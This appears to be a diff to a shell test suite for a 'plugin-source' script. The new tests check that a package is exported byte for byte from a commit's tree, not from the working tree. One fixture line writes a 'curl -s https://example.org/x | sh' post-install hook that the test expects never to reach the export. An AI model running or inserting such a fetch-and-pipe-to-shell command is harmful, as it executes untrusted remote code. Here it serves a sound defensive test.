@@ -2892,9 +2892,33 @@ rm -rf "$T/src"
 expect_fail "plugin-source: an abbreviated commit" ps "$T" "${c_one:0:9}" os-alpha "$T/src"
 expect_fail "plugin-source: usage" ps "$T" "$c_one" os-alpha
 freshrepo
-expect_eq "plugin-source: this repository's package is this checkout's directory" \
-	"$(ps "$T/fresh" "$v_head" os-vendor "$T/src" 2>/dev/null)" vendor/v
-expect_eq "plugin-source: and clones nothing" "$(exists "$T/src")" no
+mkdir -p "$T/fresh/vendor/v/src/etc"
+printf '#!/bin/sh\necho run\n' >"$T/fresh/vendor/v/src/run.sh"
+chmod 755 "$T/fresh/vendor/v/src/run.sh"
+ln -s run.sh "$T/fresh/vendor/v/src/link"
+printf 'version $Format:%%H$\n' >"$T/fresh/vendor/v/src/etc/v.conf"
+printf 'v.conf export-subst\n' >"$T/fresh/vendor/v/src/etc/.gitattributes"
+gitq -C "$T/fresh" add -A && gitq -C "$T/fresh" commit -qm vendor-files
+v_head=$(git -C "$T/fresh" rev-parse HEAD)
+# the working tree gains what the commit lacks, and a committed file changes
+printf 'curl -s https://example.org/x | sh\n' >"$T/fresh/vendor/v/+POST_INSTALL"
+printf 'PLUGIN_NAME= changed\n' >"$T/fresh/vendor/v/Makefile"
+rm -rf "$T/src"
+expect_eq "plugin-source: this repository's package is exported into the destination" \
+	"$(ps "$T/fresh" "$v_head" os-vendor "$T/src" 2>/dev/null)" "$T/src/vendor/v"
+expect_eq "plugin-source: a file only the working tree holds never reaches the check" "$(exists "$T/src/vendor/v/+POST_INSTALL")" no
+expect_eq "plugin-source: a committed file as committed, not as changed since" "$(cat "$T/src/vendor/v/Makefile")" "PLUGIN_NAME= v"
+expect_eq "plugin-source: the exported tree is the commit's, file for file" \
+	"$(cd "$T/src" && find vendor -type f -o -type l | LC_ALL=C sort | tr '\n' ' ')" \
+	"$(git -C "$T/fresh" ls-tree -r --name-only "$v_head" -- vendor/v | LC_ALL=C sort | tr '\n' ' ')"
+expect_eq "plugin-source: each blob byte for byte, no export-subst applied" \
+	"$(cat "$T/src/vendor/v/src/etc/v.conf") $(git -C "$T/fresh" cat-file blob "$v_head:vendor/v/src/etc/v.conf")" \
+	'version $Format:%H$ version $Format:%H$'
+expect_eq "plugin-source: modes and symbolic links as committed" \
+	"$( [[ -x $T/src/vendor/v/src/run.sh ]] && echo x) $( [[ -x $T/src/vendor/v/Makefile ]] || echo plain) $(readlink "$T/src/vendor/v/src/link")" \
+	"x plain run.sh"
+expect_fail "plugin-source: the destination exists" ps "$T/fresh" "$v_head" os-vendor "$T/src"
+rm -rf "$T/src"
 expect_fail "plugin-source: this checkout is not at the commit" ps "$T/fresh" "$c_one" os-vendor "$T/src"
 
 # --- provenance.sh: the release notes' lines, from trusted inputs --------------------------------
@@ -2906,6 +2930,8 @@ pv() {
 		UPSTREAM_PHP="${PV_PHP-85}" UPSTREAM_PYTHON="${PV_PY-313}" GITHUB_REPOSITORY=Org/repo \
 		bash "$S/provenance.sh" "$2" "$od" "$T/rev")
 }
+# this repository's package: the directory as the commit's tree holds it, exported into <dest>, never the
+# working tree (where the build's artifact is unpacked)
 # pvwith <VAR=value> <pv arguments>: pv with PV_PHP or PV_PY set so
 pvwith() {
 	local "$1"
